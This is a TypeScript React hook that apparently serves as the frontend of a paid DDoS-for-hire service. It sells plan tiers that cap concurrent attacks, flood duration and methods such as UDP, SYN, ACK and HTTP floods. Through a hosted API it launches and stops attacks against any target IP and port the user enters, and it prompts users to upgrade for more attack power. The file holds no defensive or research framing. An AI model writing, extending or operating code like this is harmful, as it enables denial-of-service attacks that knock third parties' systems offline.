import { useState, useEffect } from 'react';
import { useToast } from '@/hooks/use-toast';

interface Attack {
  id: number;
  target: string;
  port: number;
  method: string;
  duration: number;
  expires_at: string;
  status: string;
  started_at?: string;
  created_at?: string;
}

interface PlanLimits {
  max_concurrents: number;
  max_duration: number;
  methods: string[] | string;
}

const PLAN_LIMITS: Record<string, PlanLimits> = {
  free: {
    max_concurrents: 1,
    max_duration: 60,
    methods: ['dns', 'udp', 'tcp']
  },
  pro: {
    max_concurrents: 3,
    max_duration: 300,
    methods: ['dns', 'udp', 'tcp', 'pps', 'syn', 'ack', 'flood', 'http']
  },
  ultimate: {
    max_concurrents: 10,
    max_duration: 1800,
    methods: 'all'
  }
};

export function useAttacks(currentUser: string | null) {
  const { toast } = useToast();
  const [attacks, setAttacks] = useState<Attack[]>([]);
  const [loading, setLoading] = useState(false);
  const [userPlan, setUserPlan] = useState('free');
  const [planLimits, setPlanLimits] = useState<PlanLimits>(PLAN_LIMITS.free);

  const ATTACKS_API = 'https://functions.poehali.dev/2cec0d22-6495-4fc9-83d1-0b97c37fac2b';
  const SETTINGS_API = 'https://functions.poehali.dev/b3667882-e8de-45d6-8bb7-8c54646552a1';

  useEffect(() => {
    fetchUserPlan();
    fetchAttacks();
    const interval = setInterval(fetchAttacks, 10000);
    return () => clearInterval(interval);
  }, []);

  const fetchUserPlan = async () => {
    try {
      const response = await fetch(SETTINGS_API, {
        headers: {
          'X-User-Id': currentUser || ''
        }
      });
      if (response.ok) {
        const data = await response.json();
        const plan = data.plan || 'free';
        const planExpires = data.plan_expires_at;
        
        let activePlan = plan;
        if (planExpires && new Date(planExpires) < new Date()) {
          activePlan = 'free';
        }

        const limits = PLAN_LIMITS[activePlan] || PLAN_LIMITS.free;
        setUserPlan(activePlan);
        setPlanLimits(limits);
      }
    } catch (error) {
      console.error('Failed to fetch user plan:', error);
    }
  };

  const fetchAttacks = async () => {
    try {
      const response = await fetch(ATTACKS_API, {
        headers: {
          'X-User-Id': currentUser || ''
        }
      });
      if (response.ok) {
        const data = await response.json();
        setAttacks(data.attacks || []);
      }
    } catch (error) {
      console.error('Failed to fetch attacks:', error);
    }
  };

  const launchAttack = async (
    target: string,
    port: string,
    duration: string,
    method: string
  ) => {
    if (!target || !port || !duration || !method) {
      toast({
        title: 'Error',
        description: 'Please fill in all fields',
        variant: 'destructive'
      });
      return false;
    }

    const runningAttacks = attacks.filter(a => 
      a.status === 'running' && new Date(a.expires_at) > new Date()
    ).length;

    if (runningAttacks >= planLimits.max_concurrents) {
      toast({
        title: 'Limit Reached',
        description: `Your ${userPlan.toUpperCase()} plan allows only ${planLimits.max_concurrents} concurrent attacks. Stop a running attack or upgrade your plan.`,
        variant: 'destructive'
      });
      return false;
    }

    if (parseInt(duration) > planLimits.max_duration) {
      toast({
        title: 'Duration Exceeded',
        description: `Your ${userPlan.toUpperCase()} plan allows max ${planLimits.max_duration}s duration. Current: ${duration}s`,
        variant: 'destructive'
      });
      return false;
    }

    if (planLimits.methods !== 'all' && !planLimits.methods.includes(method.toLowerCase())) {
      toast({
        title: 'Method Not Allowed',
        description: `Method "${method}" is not available in your ${userPlan.toUpperCase()} plan. Upgrade to access more methods.`,
        variant: 'destructive'
      });
      return false;
    }

    setLoading(true);

    try {
      const response = await fetch(ATTACKS_API, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-User-Id': currentUser || ''
        },
        body: JSON.stringify({
          action: 'start',
          target,
          port: parseInt(port),
          duration: parseInt(duration),
          method: method.toUpperCase()
        })
      });

      const data = await response.json();

      if (response.ok) {
        toast({
          title: 'Success',
          description: `Attack launched on ${target}:${port}`
        });
        
        await fetchAttacks();
        return true;
      } else {
        toast({
          title: 'Error',
          description: data.error || 'Failed to launch attack',
          variant: 'destructive'
        });
        return false;
      }
    } catch (error) {
      toast({
        title: 'Error',
        description: 'Failed to connect to server',
        variant: 'destructive'
      });
      return false;
    } finally {
      setLoading(false);
    }
  };

  const stopAllAttacks = async () => {
    const runningAttacks = attacks.filter(a => a.status === 'running');
    
    if (runningAttacks.length === 0) {
      toast({
        title: 'Info',
        description: 'No running attacks to stop'
      });
      return;
    }

    setLoading(true);

    try {
      await Promise.all(
        runningAttacks.map(attack =>
          fetch(ATTACKS_API, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
              'X-User-Id': currentUser || ''
            },
            body: JSON.stringify({
              action: 'stop',
              attack_id: attack.id
            })
          })
        )
      );

      toast({
        title: 'Stopped',
        description: 'All attacks have been stopped'
      });
      
      await fetchAttacks();
    } catch (error) {
      toast({
        title: 'Error',
        description: 'Failed to stop some attacks',
        variant: 'destructive'
      });
    } finally {
      setLoading(false);
    }
  };

  return {
    attacks,
    loading,
    userPlan,
    planLimits,
    launchAttack,
    stopAllAttacks
  };
}
